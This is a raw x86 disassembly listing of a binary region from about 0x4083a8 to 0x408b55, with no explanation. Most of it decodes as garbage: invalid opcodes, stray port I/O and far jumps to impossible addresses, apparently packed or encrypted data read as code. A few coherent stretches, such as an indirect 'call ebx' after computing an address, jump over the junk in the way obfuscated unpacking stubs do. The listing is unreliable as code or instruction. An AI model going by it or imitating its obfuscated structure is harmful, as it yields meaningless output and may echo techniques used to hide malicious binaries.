  4083a8:	mov    ds:0x1d644419,eax
  4083ad:	fwait
  4083ae:	aaa    
  4083af:	cmp    DWORD PTR [edi],ebp
  4083b1:	and    bh,BYTE PTR [edi-0x2e8bcc78]
  4083b7:	fst    DWORD PTR [esi]
  4083b9:	imul   DWORD PTR [eax-0x3959f6fc]
  4083bf:	push   ss
  4083c0:	mov    cl,0xa4
  4083c2:	mov    esp,0x302f4914
  4083c7:	pop    ss
  4083c8:	sub    DWORD PTR [ebp-0x22],edi
  4083cb:	(bad)  
  4083cc:	lahf   
  4083cd:	ds and bl,al
  4083d0:	mov    esi,0x3adb599d
  4083d5:	jl     0x408452
  4083d7:	xchg   esi,eax
  4083d8:	push   edi
  4083d9:	jmp    0x9613c12d
  4083de:	push   edi
  4083df:	loopne 0x408416
  4083e1:	ss pop ebx
  4083e3:	sub    eax,DWORD PTR [esi]
  4083e5:	adc    DWORD PTR [edx-0xeb528f7],edx
  4083eb:	xor    BYTE PTR [edx],ch
  4083ed:	jno    0x408405
  4083ef:	in     al,0x82
  4083f1:	inc    ebp
  4083f2:	fisub  DWORD PTR [eax]
  4083f4:	(bad)  
  4083f6:	fimul  WORD PTR [ecx]
  4083f8:	add    eax,0x70cca66d
  4083fd:	inc    ebx
  4083fe:	xchg   BYTE PTR [ecx-0x16],bh
  408401:	jle    0x408458
  408403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408404:	and    cl,BYTE PTR [esi-0x2657aa8]
  40840a:	stos   DWORD PTR es:[edi],eax
  40840b:	inc    edi
  40840c:	cmp    al,0x94
  40840e:	xor    edx,DWORD PTR [ecx+0x18c33a3]
  408414:	cld    
  408415:	push   es
  408416:	ret    0xd262
  408419:	add    ah,ah
  40841b:	loope  0x4083f8
  40841d:	stos   DWORD PTR es:[edi],eax
  40841e:	fs sbb eax,0xe83b27f9
  408424:	mov    dl,0xd3
  408426:	rcr    ecx,0x50
  408429:	jp     0x408496
  40842b:	or     DWORD PTR [ebx-0x32122e1b],edx
  408431:	inc    ebp
  408432:	lods   eax,DWORD PTR ds:[esi]
  408433:	jbe    0x408474
  408435:	mov    edx,0x22379c03
  40843a:	dec    eax
  40843b:	and    DWORD PTR [eax],ebp
  40843d:	adc    al,0x54
  40843f:	sub    cl,dl
  408441:	ja     0x4083d1
  408443:	ins    DWORD PTR es:[edi],dx
  408444:	test   BYTE PTR [ebp-0x32],ch
  408447:	adc    esp,esp
  408449:	xor    eax,0xa1c6cc90
  40844e:	sub    BYTE PTR [edx-0x15bf5daf],dh
  408454:	pop    ds
  408455:	sub    DWORD PTR [esi],esi
  408457:	shl    edi,1
  408459:	mov    dl,BYTE PTR [edi-0x2cbf98ba]
  40845f:	lea    esp,[edi-0x1ed267e4]
  408465:	aam    0x19
  408467:	jmp    0x2b01:0x5abc0f14
  40846e:	adc    edi,DWORD PTR [eax-0x48a00661]
  408474:	neg    BYTE PTR [esi+0x4bfaccc4]
  40847a:	sbb    BYTE PTR [ecx-0x54],ch
  40847d:	jb     0x4084f1
  40847f:	xor    eax,ecx
  408481:	jmp    0x40860a
  408486:	sub    ecx,DWORD PTR [eax]
  408488:	sti    
  408489:	je     0x408486
  40848b:	out    0xfb,eax
  40848d:	sub    ecx,DWORD PTR [ebp+0x422c4c8b]
  408493:	push   ecx
  408494:	pop    edi
  408495:	scas   al,BYTE PTR es:[edi]
  408496:	fistp  QWORD PTR [edi]
  408498:	jl     0x408516
  40849a:	call   0xc0bd011e
  40849f:	or     al,0x3e
  4084a1:	push   ss
  4084a2:	sub    BYTE PTR [ecx],al
  4084a4:	sbb    al,BYTE PTR [edx+0xf]
  4084a7:	mov    ecx,0x855edaa3
  4084ac:	mov    dl,0x2a
  4084ae:	xlat   BYTE PTR ds:[ebx]
  4084af:	(bad)  
  4084b0:	test   eax,0x924f922f
  4084b5:	inc    ebx
  4084b6:	push   esi
  4084b7:	or     dh,BYTE PTR [ecx+0x27]
  4084ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084bb:	xor    edx,edx
  4084bd:	ja     0x408465
  4084bf:	cmp    al,BYTE PTR [ebx+eiz*1-0x4c]
  4084c3:	fwait
  4084c4:	and    ebp,DWORD PTR [edi+0x3d]
  4084c7:	inc    ebx
  4084c8:	mov    gs:0x2092092e,eax
  4084ce:	out    0x6,eax
  4084d0:	mov    al,ds:0x6ea87635
  4084d5:	add    ah,BYTE PTR [esi]
  4084d7:	xor    al,0xd5
  4084d9:	inc    bx
  4084db:	stos   DWORD PTR es:[edi],eax
  4084dc:	xchg   esi,eax
  4084dd:	ins    DWORD PTR es:[edi],dx
  4084de:	xchg   esi,eax
  4084df:	loopne 0x4084f6
  4084e1:	jae    0x40849b
  4084e3:	and    al,0xcb
  4084e5:	inc    ebx
  4084e6:	ss out 0x14,al
  4084e9:	pop    ebp
  4084ea:	pop    eax
  4084eb:	enter  0x5c1a,0x30
  4084ef:	outs   dx,DWORD PTR ds:[esi]
  4084f0:	hlt    
  4084f1:	cmp    dh,ah
  4084f3:	sbb    DWORD PTR [ebx+0x7e85096],esp
  4084f9:	mov    eax,ds:0x4347c1aa
  4084fe:	adc    DWORD PTR [ebx-0x4111b2c1],esp
  408504:	mov    ah,0xb6
  408506:	in     eax,0xb
  408508:	pop    es
  408509:	fdiv   DWORD PTR [edx-0x2c]
  40850c:	xor    BYTE PTR cs:[eax],ch
  40850f:	in     eax,dx
  408510:	stos   DWORD PTR es:[edi],eax
  408511:	xchg   ecx,esp
  408513:	xor    BYTE PTR [ecx-0x75e2bca],0x46
  40851a:	xchg   ecx,eax
  40851b:	ror    DWORD PTR [esi],1
  40851d:	pop    ebp
  40851e:	call   0x95204fb9
  408523:	xchg   edi,eax
  408524:	mov    ?,WORD PTR [edi+ecx*1+0x2d]
  408528:	mov    al,ds:0x2c16e159
  40852d:	repnz sub al,0xf0
  408530:	into   
  408531:	xor    eax,0xd22b66da
  408536:	mov    ds:0x85ded020,eax
  40853b:	xchg   dh,cl
  40853d:	jns    0x4085b3
  40853f:	(bad)  
  408540:	lahf   
  408541:	inc    esi
  408542:	jnp    0x4085ac
  408544:	adc    ebx,ecx
  408546:	enter  0x4036,0xd
  40854a:	mov    bh,0xa0
  40854c:	adc    DWORD PTR [eax+0x10],0x27
  408550:	jnp    0x408508
  408552:	xor    ebp,eax
  408554:	sahf   
  408555:	push   0x1fe508cd
  40855a:	jecxz  0x408555
  40855c:	repz xor eax,0x7734e1a8
  408562:	add    bh,BYTE PTR [ebp+0x6a]
  408565:	mov    ch,0x60
  408567:	jge    0x408586
  408569:	in     al,0x86
  40856b:	cmc    
  40856c:	dec    ebp
  40856d:	das    
  40856e:	push   ebx
  40856f:	(bad)  [edi+0x686f8656]
  408575:	inc    eax
  408576:	(bad)  
  408578:	ret    
  408579:	inc    ecx
  40857a:	sbb    ebx,esp
  40857c:	pushw  cs
  40857e:	retf   0xacd6
  408581:	sahf   
  408582:	fild   WORD PTR [edx+0x14]
  408585:	inc    eax
  408586:	not    DWORD PTR [ecx+0x27]
  408589:	lods   eax,DWORD PTR ds:[esi]
  40858a:	pusha  
  40858b:	loopne 0x40856c
  40858d:	mov    edi,DWORD PTR ds:0x91658e2d
  408593:	sub    eax,0x3c061f5a
  408598:	push   ds
  408599:	stos   DWORD PTR es:[edi],eax
  40859a:	int    0xa1
  40859c:	mov    ebp,0xa0df6888
  4085a1:	out    dx,al
  4085a2:	push   ebx
  4085a3:	inc    ebp
  4085a4:	xchg   ecx,eax
  4085a5:	sahf   
  4085a6:	(bad)  
  4085a7:	hlt    
  4085a8:	jmp    0x6d46f3ff
  4085ad:	test   al,0xee
  4085b0:	shl    BYTE PTR [edi+0x70],1
  4085b3:	mov    eax,ds:0x985c6ca2
  4085b8:	rcl    ch,0x75
  4085bb:	push   ecx
  4085bc:	push   esi
  4085bd:	mov    dh,0xe0
  4085bf:	dec    eax
  4085c0:	sub    al,0x77
  4085c2:	repz rcr cl,cl
  4085c5:	ds jne 0x408583
  4085c8:	mov    ah,BYTE PTR [edi]
  4085ca:	xchg   ecx,eax
  4085cb:	push   edx
  4085cc:	fiadd  DWORD PTR [ebx-0x1d]
  4085cf:	xchg   esp,eax
  4085d0:	cmp    al,0xa4
  4085d2:	inc    ebx
  4085d3:	push   0xffffff85
  4085d5:	and    ebx,DWORD PTR ss:[edi]
  4085d8:	or     eax,0xea4ccdf2
  4085dd:	dec    ebx
  4085de:	add    DWORD PTR [edx+0x6d472f5d],ecx
  4085e4:	test   al,0x2f
  4085e6:	out    0xd9,eax
  4085e8:	rcr    DWORD PTR [edi-0x1732f9f8],cl
  4085ee:	outs   dx,BYTE PTR ds:[esi]
  4085ef:	(bad)  
  4085f1:	mov    cl,BYTE PTR [ebx+0x6c6b44ef]
  4085f7:	dec    BYTE PTR [esi+0xeebb106]
  4085fd:	pushf  
  4085fe:	jp     0x408635
  408600:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408601:	nop
  408602:	dec    eax
  408603:	inc    ebp
  408604:	loopne 0x40864e
  408606:	push   edx
  408607:	dec    esi
  408608:	cmp    BYTE PTR ds:0xaf0fc603,dh
  40860e:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  408614:	mov    ecx,DWORD PTR [ebp+0x8]
  408617:	lea    ecx,[edx+ecx*1+0x32729e]
  40861e:	cmp    ecx,eax
  408620:	jmp    0x4087a9
  408625:	test   DWORD PTR [edi],esp
  408627:	in     al,dx
  408628:	iret   
  408629:	jp     0x4085f2
  40862b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40862c:	jge    0x4085fc
  40862e:	(bad)  
  40862f:	loope  0x408624
  408631:	aas    
  408632:	out    dx,eax
  408633:	mov    edx,0x7c3e4b47
  408638:	jl     0x408622
  40863a:	jg     0x4086b8
  40863c:	jl     0x408689
  40863e:	mov    ch,0x9b
  408640:	jb     0x4085c7
  408642:	(bad)  
  408643:	mov    esp,0xf4dba56d
  408648:	lea    ebx,[ecx]
  40864a:	loopne 0x408673
  40864c:	lea    edx,[edi-0x152e77d5]
  408652:	mov    edx,0x315d590e
  408657:	in     al,dx
  408658:	lock jns 0x4086cc
  40865b:	sti    
  40865c:	cwde   
  40865d:	sub    eax,DWORD PTR [ebx+ebx*8]
  408660:	add    bh,BYTE PTR [eax+0x562fc093]
  408666:	enter  0xb721,0x7f
  40866a:	add    BYTE PTR [eax*8-0x11d1fccc],bl
  408671:	leave  
  408672:	push   esp
  408673:	lds    esi,FWORD PTR [esi]
  408675:	fldcw  WORD PTR [ecx-0x5b6943d5]
  40867b:	out    0xf9,al
  40867d:	add    bl,dh
  40867f:	loop   0x4086b8
  408681:	add    ebx,DWORD PTR [edx+0x4f]
  408684:	dec    esi
  408685:	sub    eax,0x9a348d53
  40868a:	cmp    BYTE PTR [edx],cl
  40868c:	js     0x408709
  40868e:	or     ecx,DWORD PTR [ebx-0x1b1c0127]
  408694:	arpl   WORD PTR [ecx+0x5a],bx
  408697:	mov    al,ds:0x24e0ea57
  40869c:	cmc    
  40869d:	mov    eax,ds:0xe379c187
  4086a2:	jp     0x40868e
  4086a4:	or     eax,0x865493fb
  4086a9:	cmp    esp,ebx
  4086ab:	sbb    al,0xc3
  4086ae:	mov    bl,0x53
  4086b0:	and    ebp,ebx
  4086b2:	jo     0x4086c9
  4086b4:	push   eax
  4086b5:	ds dec ebx
  4086b7:	fwait
  4086b8:	xor    cl,cl
  4086ba:	cmovbe edi,DWORD PTR [edi]
  4086bd:	div    BYTE PTR [ecx]
  4086bf:	in     al,0xb7
  4086c1:	int3   
  4086c2:	stc    
  4086c3:	or     DWORD PTR [ebx],esp
  4086c5:	inc    ebp
  4086c6:	or     ah,BYTE PTR [edx-0x17]
  4086c9:	fstp   DWORD PTR [di-0x44]
  4086cd:	je     0x4086cc
  4086cf:	lods   eax,DWORD PTR ds:[esi]
  4086d0:	adc    al,0x52
  4086d2:	out    0xb4,eax
  4086d4:	je     0x4086f0
  4086d6:	mov    esp,DWORD PTR [ebx]
  4086d8:	and    BYTE PTR [esi],0x6a
  4086db:	mov    ecx,0xb53fe5f3
  4086e0:	pop    ecx
  4086e1:	mov    ds:0xc68d3868,eax
  4086e6:	pop    edx
  4086e7:	fld    QWORD PTR [esi+0x4bc5f034]
  4086ed:	or     DWORD PTR [ebx-0x1b2f371c],edx
  4086f3:	stos   BYTE PTR es:[edi],al
  4086f4:	adc    eax,0x9528602e
  4086f9:	lds    edi,FWORD PTR ds:0xbeae30cf
  4086ff:	out    dx,al
  408700:	ins    BYTE PTR es:[edi],dx
  408701:	and    BYTE PTR [ebp+0x3b],ch
  408704:	test   DWORD PTR [edx-0x24ac2871],ebp
  40870a:	sub    eax,0xdb2d4661
  40870f:	sbb    edx,DWORD PTR [edx+0x5e]
  408712:	ret    
  408713:	test   BYTE PTR [ecx],0x1d
  408716:	push   edx
  408717:	ret    
  408718:	fist   DWORD PTR [esi+0x53]
  40871b:	cdq    
  40871c:	pop    edi
  40871d:	dec    esi
  40871e:	aam    0x2f
  408720:	and    edi,edx
  408722:	mov    DWORD PTR [edi],0x25c078c
  408728:	adc    eax,0x20e8158
  40872d:	jae    0x408768
  40872f:	mov    ah,0x45
  408731:	shr    cl,1
  408733:	mov    bl,0x62
  408735:	js     0x408730
  408737:	sahf   
  408738:	sbb    BYTE PTR [ecx],ch
  40873a:	xor    eax,ebx
  40873c:	inc    esi
  40873d:	mov    edi,0x502f1442
  408742:	or     BYTE PTR [ebx+0x6f],dh
  408745:	push   ss
  408746:	int    0x7d
  408748:	pop    ebx
  408749:	dec    edx
  40874a:	or     ch,al
  40874c:	das    
  40874d:	push   esi
  40874e:	xchg   edi,eax
  40874f:	das    
  408750:	inc    esi
  408751:	(bad)  
  408752:	mov    ebp,0x1733cad2
  408757:	outs   dx,DWORD PTR ds:[esi]
  408758:	fist   DWORD PTR [eax-0x3d8e7d40]
  40875e:	es dec ebp
  408760:	aaa    
  408761:	(bad)  
  408762:	inc    DWORD PTR [eax+0x150ab2a5]
  408768:	push   edx
  408769:	iret   
  40876a:	add    esp,DWORD PTR [ecx+0x79]
  40876d:	pop    esp
  40876e:	mov    eax,ds:0xd2c99aff
  408773:	inc    eax
  408774:	pop    es
  408775:	js     0x408775
  408777:	dec    esi
  408778:	shr    BYTE PTR [edx+0x69],0x6d
  40877c:	sbb    al,0x6d
  40877e:	add    eax,0x2ef003d9
  408783:	xor    eax,0xb00ae1b9
  408788:	iret   
  408789:	xor    bl,BYTE PTR [ebx+0x22]
  40878c:	sub    ebp,DWORD PTR [edi+edi*1+0x6f1d8968]
  408793:	mov    ss,ebx
  408795:	xchg   ebx,eax
  408796:	aad    0xa2
  408798:	dec    ebx
  408799:	xchg   edi,eax
  40879a:	stos   BYTE PTR es:[edi],al
  40879b:	pusha  
  40879c:	loopne 0x40872f
  40879e:	or     DWORD PTR [edi+0x16e73410],eax
  4087a4:	aaa    
  4087a5:	dec    edi
  4087a6:	out    0x6d,eax
  4087a8:	test   al,0xf
  4087aa:	test   ecx,ebp
  4087ac:	idiv   edi
  4087ae:	dec    DWORD PTR [ebx+0x5e9de]
  4087b4:	add    BYTE PTR [eax],al
  4087b6:	mov    ebx,0x32729e
  4087bb:	mov    eax,DWORD PTR [ebp-0x4]
  4087be:	xor    eax,0x7510857
  4087c3:	add    eax,ebx
  4087c5:	mov    DWORD PTR [ebp-0xc],eax
  4087c8:	xor    ebx,ebx
  4087ca:	lea    eax,[ebp-0x10]
  4087cd:	add    ebx,DWORD PTR [eax]
  4087cf:	call   ebx
  4087d1:	xor    ebx,ebx
  4087d3:	inc    ebx
  4087d4:	cmp    DWORD PTR [ebp+0x10],ebx
  4087d7:	je     0x40897e
  4087dd:	xchg   edx,eax
  4087de:	push   0xa
  4087e0:	pop    ecx
  4087e1:	push   0x4
  4087e3:	pop    ebx
  4087e4:	inc    ebx
  4087e5:	xchg   ebx,ecx
  4087e7:	sub    ebx,ecx
  4087e9:	xchg   ebx,ecx
  4087eb:	dec    ecx
  4087ec:	mov    eax,DWORD PTR [ebp-0x1c]
  4087ef:	jmp    0x408978
  4087f4:	hlt    
  4087f5:	jecxz  0x4087ee
  4087f7:	dec    esi
  4087f8:	jnp    0x408874
  4087fa:	pop    ecx
  4087fb:	std    
  4087fc:	sahf   
  4087fd:	retf   0x4846
  408800:	push   es
  408801:	ss clc 
  408803:	xor    DWORD PTR [edi],esp
  408805:	xor    BYTE PTR [esp+edi*2-0x18],bh
  408809:	jg     0x408887
  40880b:	jl     0x4087e2
  40880d:	loope  0x4087c4
  40880f:	pop    edx
  408810:	out    0xe4,al
  408812:	stos   DWORD PTR es:[di],eax
  408814:	mov    edx,0x64dc2854
  408819:	mov    ebp,0x62cf1d36
  40881e:	mov    eax,0xcc10ce05
  408823:	and    edx,ecx
  408825:	mov    ebp,0xc47e4d67
  40882a:	mov    eax,0x11b1d665
  40882f:	pop    ds
  408830:	dec    ebx
  408831:	mov    ch,BYTE PTR [ebp-0x4f]
  408834:	jo     0x40881c
  408836:	and    dh,BYTE PTR [ebp+0x27]
  408839:	add    bl,BYTE PTR [eax+0xae55569]
  40883f:	fincstp 
  408841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408842:	pop    ecx
  408843:	pop    ebx
  408844:	ds nop
  408846:	popf   
  408847:	or     eax,0x44572e77
  40884c:	leave  
  40884d:	test   DWORD PTR [esi],esp
  40884f:	test   DWORD PTR [ecx],ecx
  408851:	push   es
  408852:	int3   
  408853:	sti    
  408854:	push   esp
  408855:	adc    DWORD PTR [ecx+0x58e827dc],esp
  40885b:	xchg   DWORD PTR [ecx+0x581316f7],ebp
  408861:	sar    ebp,0xc2
  408864:	cmp    edi,ecx
  408866:	push   edi
  408867:	lds    eax,FWORD PTR [edi]
  408869:	shl    DWORD PTR [eax+0x4a0791a8],cl
  40886f:	sbb    eax,0xa0786e96
  408874:	inc    ebx
  408875:	sbb    DWORD PTR ds:0xcf5d3af,eax
  40887b:	or     dl,bh
  40887d:	pop    esp
  40887e:	neg    DWORD PTR [ebx]
  408880:	stc    
  408881:	dec    eax
  408882:	inc    esi
  408883:	and    al,0x4b
  408885:	mov    eax,ds:0x2390c
  40888a:	sub    DWORD PTR [esi-0x60a81dc1],edx
  408890:	scas   al,BYTE PTR es:[edi]
  408891:	cmp    DWORD PTR [edi],edx
  408893:	push   esp
  408894:	int    0xb4
  408896:	repnz outs dx,BYTE PTR ds:[esi]
  408898:	push   0x4c959610
  40889d:	lods   eax,DWORD PTR ds:[esi]
  40889e:	clc    
  40889f:	fsub   DWORD PTR [edi+0x3daa601c]
  4088a5:	mov    dl,0xb0
  4088a7:	out    0xdf,al
  4088a9:	rcl    BYTE PTR [ebx],1
  4088ab:	pushf  
  4088ac:	scas   al,BYTE PTR es:[edi]
  4088ad:	fwait
  4088ae:	stos   DWORD PTR es:[edi],eax
  4088af:	cs push ecx
  4088b1:	and    edx,DWORD PTR [ebx-0x41]
  4088b4:	out    dx,al
  4088b5:	sub    ah,BYTE PTR [edx]
  4088b7:	and    DWORD PTR [ebx+0x3eb0a999],esi
  4088bd:	loope  0x4088a8
  4088bf:	retf   0xf403
  4088c2:	jecxz  0x408905
  4088c4:	jle    0x408861
  4088c6:	inc    edx
  4088c7:	imul   esp,DWORD PTR [eax-0x62],0xffffffbd
  4088cb:	mov    ds:0x349c0c02,al
  4088d0:	and    DWORD PTR [edi-0x25],esi
  4088d3:	push   ds
  4088d4:	iret   
  4088d5:	pop    edi
  4088d6:	daa    
  4088d7:	call   0x4bf022db
  4088dc:	test   al,0x80
  4088de:	pop    ds
  4088df:	adc    esp,DWORD PTR [esi+eax*2+0x78]
  4088e3:	das    
  4088e4:	jg     0x40894b
  4088e6:	add    al,0xee
  4088e8:	hlt    
  4088e9:	scas   eax,DWORD PTR es:[edi]
  4088ea:	jbe    0x4088ab
  4088ec:	adc    DWORD PTR [ecx-0x7e],0x4d
  4088f0:	xor    eax,0x210290ff
  4088f5:	jmp    0x4ee3:0x7edc9a87
  4088fc:	mov    DWORD PTR [edx+ebx*1-0x792d8843],ecx
  408903:	dec    edx
  408904:	repnz adc bl,bh
  408907:	mov    dl,0xe3
  408909:	(bad)  
  40890a:	jno    0x408916
  40890c:	int3   
  40890d:	popf   
  40890e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40890f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408910:	inc    ecx
  408911:	pop    ebp
  408912:	(bad)  
  408913:	fstp   DWORD PTR [ebx]
  408915:	mov    esp,DWORD PTR [ebp-0x32]
  408918:	rol    DWORD PTR es:[edx-0x4bb64843],1
  40891f:	sub    DWORD PTR [ecx],esp
  408921:	ja     0x4088d0
  408923:	push   ss
  408924:	bound  edi,QWORD PTR [eax]
  408926:	mov    DWORD PTR [ebp+0x54abd96c],edi
  40892c:	das    
  40892d:	adc    eax,0xd8d0cac1
  408932:	and    DWORD PTR [ecx],ebx
  408934:	(bad)  
  408935:	fdivr  QWORD PTR [edi]
  408937:	bswap  esi
  408939:	inc    edx
  40893a:	fisttp DWORD PTR [ebp+0x796eac38]
  408940:	sub    al,0x86
  408942:	jmp    0x722b:0xa702f968
  408949:	sbb    dl,BYTE PTR [edi+0x3c]
  40894c:	inc    eax
  40894d:	aam    0xe1
  40894f:	mov    BYTE PTR [ebx-0x2b],dl
  408952:	pushf  
  408953:	outs   dx,DWORD PTR ds:[esi]
  408954:	cmp    edi,DWORD PTR [edx+0x4a]
  408957:	cmp    al,0xed
  408959:	cwde   
  40895a:	pop    es
  40895b:	sbb    edx,eax
  40895d:	and    eax,0xc344d1bc
  408962:	mov    ebx,0xeb5bf863
  408967:	mov    ebp,0x9f74868e
  40896c:	pusha  
  40896d:	das    
  40896e:	jmp    0xf4f4:0x8dad6deb
  408975:	cmp    esp,0x24
  408978:	imul   eax,ecx
  40897b:	add    esp,eax
  40897d:	xchg   edx,eax
  40897e:	push   eax
  40897f:	xor    ebx,ebx
  408981:	mov    edx,esp
  408983:	dec    edx
  408984:	jmp    0x408b0d
  408989:	xchg   BYTE PTR [edx+0x456bbe5f],ah
  40898f:	mov    ecx,0xfaf08d7a
  408994:	mov    esi,0x29ecb822
  408999:	xchg   ebx,eax
  40899a:	xor    edi,DWORD PTR [esp+edi*2-0x18]
  40899e:	jg     0x408a1c
  4089a0:	jl     0x4089c1
  4089a2:	cwde   
  4089a3:	retf   0xdb76
  4089a6:	or     DWORD PTR [eax+0xd],0x23
  4089aa:	(bad)  
  4089ab:	cli    
  4089ac:	jmp    0x408a1b
  4089ae:	dec    edx
  4089af:	add    cl,0xcb
  4089b2:	ins    BYTE PTR es:[edi],dx
  4089b3:	leave  
  4089b4:	sbb    dh,cl
  4089b6:	mov    gs,WORD PTR [esi]
  4089b8:	inc    ebx
  4089b9:	add    al,0x21
  4089bb:	or     ebp,edx
  4089bd:	mov    eax,esp
  4089bf:	mov    ebx,fs
  4089c1:	sbb    DWORD PTR [ebx+edi*8-0x19b911e6],edi
  4089c8:	in     eax,0xac
  4089ca:	shl    BYTE PTR [ebx],1
  4089cc:	mov    ah,0x61
  4089ce:	xchg   ecx,eax
  4089cf:	add    edi,DWORD PTR ds:0x96740355
  4089d5:	xchg   esi,ebx
  4089d7:	int3   
  4089d8:	clc    
  4089d9:	push   ebp
  4089da:	div    BYTE PTR [esi]
  4089dc:	ds retf 
  4089de:	cmp    BYTE PTR [edx-0x11],0x8
  4089e2:	sbb    DWORD PTR [edx+eax*4],ebx
  4089e5:	pop    ds
  4089e6:	jbe    0x40898d
  4089e8:	cwde   
  4089e9:	cs push esi
  4089eb:	call   0xf9ef5bb3
  4089f0:	sbb    ch,bh
  4089f2:	aaa    
  4089f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089f4:	push   ebx
  4089f5:	repz add eax,DWORD PTR [esi-0x5112c0d7]
  4089fc:	pop    ebp
  4089fd:	lds    ebx,FWORD PTR [esp+esi*4-0x33]
  408a01:	mov    ecx,0x23f30a7b
  408a06:	adc    al,0xd
  408a08:	push   ecx
  408a09:	sbb    al,0x7c
  408a0b:	in     eax,dx
  408a0c:	pop    edx
  408a0d:	xchg   edi,eax
  408a0e:	or     ah,dh
  408a10:	out    dx,al
  408a11:	and    ebp,DWORD PTR [ebp+0x2b]
  408a14:	stc    
  408a15:	jno    0x4089f5
  408a17:	ins    BYTE PTR es:[edi],dx
  408a18:	test   eax,0xdf92bf35
  408a1d:	out    0xc3,al
  408a1f:	mov    BYTE PTR [ebx],ah
  408a21:	int    0x5f
  408a23:	test   al,0xfa
  408a25:	jbe    0x4089f3
  408a27:	xor    cl,ah
  408a29:	cmp    cl,BYTE PTR [ecx-0x243d352c]
  408a2f:	xor    ecx,DWORD PTR [ecx+0x45a8af5a]
  408a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a36:	adc    esp,ecx
  408a38:	(bad)  
  408a39:	in     eax,0x14
  408a3b:	mov    bh,0x54
  408a3d:	rcl    DWORD PTR [esi],cl
  408a3f:	xor    cl,BYTE PTR [edx-0x4d]
  408a42:	loopne 0x4089f8
  408a44:	dec    edx
  408a45:	imul   edi,DWORD PTR [edi],0xffffffa1
  408a48:	aas    
  408a49:	push   0x1f
  408a4b:	or     al,0x92
  408a4d:	jl     0x408abd
  408a4f:	(bad)  
  408a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a51:	inc    ecx
  408a52:	pop    ebx
  408a53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a54:	pop    ecx
  408a55:	xchg   esi,eax
  408a56:	cmp    edx,ebx
  408a58:	ss stos DWORD PTR es:[edi],eax
  408a5a:	xchg   BYTE PTR [edx+0x62],al
  408a5d:	xlat   BYTE PTR ds:[bx]
  408a5f:	aas    
  408a60:	ffreep st(3)
  408a62:	lea    ecx,[edx+0x53]
  408a65:	jnp    0x408a7a
  408a67:	mov    edx,0x84926529
  408a6c:	repnz cdq 
  408a6e:	push   ebx
  408a6f:	ret    0xc437
  408a72:	inc    ecx
  408a73:	jp     0x408a74
  408a75:	xchg   edi,eax
  408a76:	mov    dl,BYTE PTR [edx]
  408a78:	sub    bh,ch
  408a7a:	retf   
  408a7b:	fcom   QWORD PTR [ecx+0x32]
  408a7e:	sbb    eax,0x42ccc0e3
  408a83:	inc    esp
  408a84:	jno    0x408adf
  408a86:	cdq    
  408a87:	xchg   edi,eax
  408a88:	jg     0x408ab5
  408a8a:	out    dx,eax
  408a8b:	outs   dx,BYTE PTR ds:[esi]
  408a8c:	jg     0x408aa0
  408a8e:	jle    0x33d49fa2
  408a94:	in     eax,0xdb
  408a96:	fadd   st(7),st
  408a98:	rol    BYTE PTR [ecx],cl
  408a9a:	jp     0x408aa0
  408a9c:	inc    ebp
  408a9d:	jge    0x408ada
  408a9f:	push   es
  408aa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408aa1:	dec    edi
  408aa2:	mov    ebx,0xc9609c21
  408aa7:	dec    edi
  408aa8:	inc    edi
  408aa9:	fild   DWORD PTR [ebp-0x3d]
  408aac:	adc    BYTE PTR [ebp+0x49],dl
  408aaf:	ror    dh,1
  408ab1:	sbb    ch,BYTE PTR [ebx-0x2b]
  408ab4:	dec    ecx
  408ab5:	inc    esi
  408ab6:	jp     0x408a6d
  408ab8:	mov    bh,0x13
  408aba:	daa    
  408abb:	ja     0x408a87
  408abd:	sbb    DWORD PTR [esi+0x1d],eax
  408ac0:	xor    al,0xc8
  408ac2:	cli    
  408ac3:	cwde   
  408ac4:	mov    edi,0xb0310cee
  408ac9:	jae    0x408b17
  408acb:	lods   al,BYTE PTR ds:[esi]
  408acc:	leave  
  408acd:	mov    ebx,0x2536b68b
  408ad2:	jmp    0xbf1bf578
  408ad7:	jne    0x408b1c
  408ad9:	in     al,dx
  408ada:	mov    dh,ch
  408adc:	popa   
  408add:	test   cl,bh
  408adf:	pop    ss
  408ae0:	int    0xeb
  408ae2:	xchg   DWORD PTR [esi],ecx
  408ae4:	push   eax
  408ae5:	sbb    eax,DWORD PTR [eax]
  408ae7:	xchg   si,ax
  408ae9:	mov    ebp,0x6176aa30
  408aee:	mov    bl,0xd1
  408af0:	ror    BYTE PTR [ebx],1
  408af2:	pop    ebx
  408af3:	mov    eax,0x1ed1deb5
  408af8:	add    edi,DWORD PTR [ebp+0x7d]
  408afb:	aaa    
  408afc:	mov    eax,0xb97f4e1d
  408b01:	sbb    eax,0x125229e
  408b06:	jno    0x408a8f
  408b08:	jmp    0x343:0x5e08acad
  408b0f:	sbb    al,0x1a
  408b11:	dec    ebx
  408b12:	xor    edx,edx
  408b14:	add    DWORD PTR [ebp-0xc],ebx
  408b17:	pop    ebx
  408b18:	mov    eax,DWORD PTR [ebp-0xc]
  408b1b:	pop    edi
  408b1c:	jmp    0x408ca5
  408b21:	add    al,0xa8
  408b23:	retf   
  408b24:	mov    al,0x7b
  408b26:	push   ebx
  408b27:	xchg   DWORD PTR [eax-0x17],edi
  408b2a:	shl    ebx,1
  408b2c:	das    
  408b2d:	cld    
  408b2e:	int    0x4
  408b30:	add    cl,BYTE PTR [edi]
  408b32:	xor    eax,0x7fe87c7c
  408b37:	jl     0x408bb5
  408b39:	call   0x9e438898
  408b3e:	push   0x23674e87
  408b43:	lock outs dx,DWORD PTR ds:[esi]
  408b45:	and    al,0x9e
  408b47:	(bad)  [ecx+0x4c]
  408b4a:	push   esi
  408b4b:	popa   
  408b4c:	push   esp
  408b4d:	pop    ss
  408b4e:	push   eax
  408b4f:	sub    DWORD PTR [ecx+0x2b],ebx
  408b52:	xchg   bh,bh
  408b54:	daa    
  408b55:	cmp    BYTE PTR [ebx+0xd217b03],cl
